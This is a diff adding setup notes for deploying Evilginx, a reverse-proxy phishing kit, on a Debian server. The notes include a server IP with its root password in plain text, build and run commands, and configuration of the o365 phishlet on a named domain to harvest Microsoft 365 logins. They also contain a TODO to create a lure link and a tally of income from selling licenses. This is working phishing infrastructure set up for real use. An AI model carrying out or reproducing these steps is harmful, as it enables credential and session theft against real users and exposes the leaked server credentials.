@@ -1,0 +1,144 @@
+HOW TO SETUP EVILGINX
+
+[DEBIAN SERVER]
+Main IP: 37.120.234.37
+Username : root
+Password: d@D+dRRCGHC-
+
+Get Debian RDP
+Download/Install Go
+
+Download the Make program (to install Evilginx faster)
+Download from Git evilginx files to Server
+Compile the project
+
+
+COMMANDS
+
+#############################
+# START OF NEW_USER SCRIPT
+#############################
+
+#- signin to debian
+#- ["your password"]
+local@Terminal# ssh root@remote-host-ip 
+
+#- change root password
+root@remote-host-ip:~# passwd
+
+#- create new user
+#- set password ["pAssw0rd"] for user 'evlcore'
+root@remote-host-ip:~# add evlcore 
+root@remote-host-ip:~# usermod -aG sudo evlcore
+
+#- setting up keys
+root@remote-host-ip:~# mkdir /home/evlcore/.ssh
+root@remote-host-ip:~# cp /root/.ssh/authorized_keys /home/evlcore/.ssh/
+root@remote-host-ip:~# chown -R evlcore:evlcore /home/evlcore/.ssh
+root@remote-host-ip:~# su - evlcore
+evlcore@remote-host-ip:~# exit
+root@remote-host-ip:~# exit
+
+#############################
+# END OF NEW_USER SCRIPT (Not Recommended)
+#############################
+
+=============================
+=============================
+=============================
+
+#############################
+# START OF DEPLOYMENT SCRIPT
+#############################
+
+#- signin to debian
+#- your ["pAssw0rd"]
+local@Terminal# ssh root@remote-host-ip
+
+#- (BATCH A)
+#- download and install go-lang
+root@remote-host-ip:~# wget https://go.dev/dl/go1.22.4.linux-amd64.tar.gz
+root@remote-host-ip:~# tar -C /usr/local -xzf go1.22.4.linux-amd64.tar.gz
+root@remote-host-ip:~# rm go1.22.4.linux-amd64.tar.gz
+
+#- add ["export PATH=$PATH:/usr/local/go/bin"] to file
+root@remote-host-ip:~# printf "\nexport PATH=$PATH:/usr/local/go/bin\n" >> ~/.profile
+root@remote-host-ip:~# go version
+
+
+#- (BATCH B)
+#- install git and make
+
+root@remote-host-ip:~# apt-get update
+ apt-get install make git
+
+#- download proj
+root@remote-host-ip:~# git clone https://github.com/oonlyjs/evlcore.git evlcore-src
+
+root@remote-host-ip:~# mkdir evlcore
+ cd evlcore-src
+
+root@remote-host-ip:evlcore-src/# make
+ cd ../evlcore
+
+root@remote-host-ip:evlcore/# cp ~/evlcore-src2/build/evilginx .
+ cp -r ~/evlcore-src/phishlets .
+ cp -r ~/evlcore-src2/redirectors .
+
+#- (BATCH C)
+#- run evilginx
+root@remote-host-ip:evlcore/# setcap CAP_NET_BIND_SERVICE=+eip evlcore/evilginx
+root@remote-host-ip:evlcore/# ./evilginx
+
+
+#############################
+# START OF PHISHLET AND LURES
+#############################
+
+#- Set DNS server
+ns1.domain.com
+ns2.domain.com
+ns3.domain.com
+ns4.domain.com
+
+#- Check if now update and available to use
+nslookup markfedspunjab.com
+
+config domain markfedspunjab.com
+config unauth_url ""
+phishlets hostname o365 markfedspunjab.com
+
+#############################
+# END OF PHISHLET AND LURES
+#############################
+
+
+===========
+
+TODO:
+Create lure and copy link.
+What can ease a person stress. How much is it?
+Major Issue. When go lang update their package version it breaks the process
+
+[NAMESERVER]
+monovm.mercury.orderbox-dns.com
+monovm.venus.orderbox-dns.com
+monovm.earth.orderbox-dns.com
+monovm.mars.orderbox-dns.com
+
+
+===========
+
+My money -> (500*0.3)*10 = USD 1,500 ["10 licenses"]
+ssh root@23.227.196.101
+
+# wget https://go.dev/dl/go1.22.4.linux-amd64.tar.gz
+# git clone https://go.googlesource.com/go goroot
+# cp -r /usr/local ./goroot/
+
+apt-get update
+apt-get install make git
+git clone https://github.com/oonlyjs/evlcore.git evlcore-src
+tar -C /usr/local -xzf evlcore-src/go1.22.4.linux-amd64.tar.gz
+printf "\nexport PATH=$PATH:/usr/local/go/bin\n" >> ~/.profile
+go version
